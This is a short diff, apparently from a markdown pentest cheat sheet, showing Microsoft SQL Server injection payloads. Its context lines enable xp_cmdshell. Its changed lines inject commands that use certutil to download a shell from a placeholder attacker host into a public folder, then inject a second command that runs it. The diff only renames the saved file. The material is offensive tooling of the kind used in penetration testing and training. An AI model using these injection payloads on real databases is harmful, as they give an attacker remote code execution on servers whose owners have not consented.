@@ -336,10 +336,10 @@ EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ```
 ```ps
-';exec xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>/shell-x64.exe c:\Users\Public\shell-x64.exe';--
+';exec xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>/shell-x64.exe c:\Users\Public\shell.bat';--
 ```
 ```ps
-';exec xp_cmdshell 'c:\Users\Public\shell-x64.exe';--
+';exec xp_cmdshell 'c:\Users\Public\shell.bat';--
 ```
 
 </details>
